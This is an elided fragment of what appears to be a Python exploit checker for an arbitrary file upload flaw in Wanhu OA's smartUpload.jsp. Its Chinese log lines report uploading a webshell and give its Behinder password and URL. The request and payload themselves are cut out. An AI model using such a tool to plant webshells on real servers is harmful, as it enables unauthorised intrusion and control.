...
------WebKitFormBoundarynNQ8hoU56tfSwBVU--'''
    ...
    print(now_time() + " [INFO]     正在检测万户OA smartUpload.jsp 任意文件上传漏洞")
    try:
        ...
        if upload.status_code == 200:
            ...
            if filename != None:
                ...
                print(now_time() + ' [SUCCESS]  上传webshell成功，默认冰蝎密码:{}'.format(shell_url))
            else:
                print(now_time() + ' [SUCCESS]  返回值为200但未获取到木马文件名称:')
        else:
            print(now_time() + ' [WARNING]  万户OA smartUpload.jsp 任意文件上传漏洞不存在')
    except:
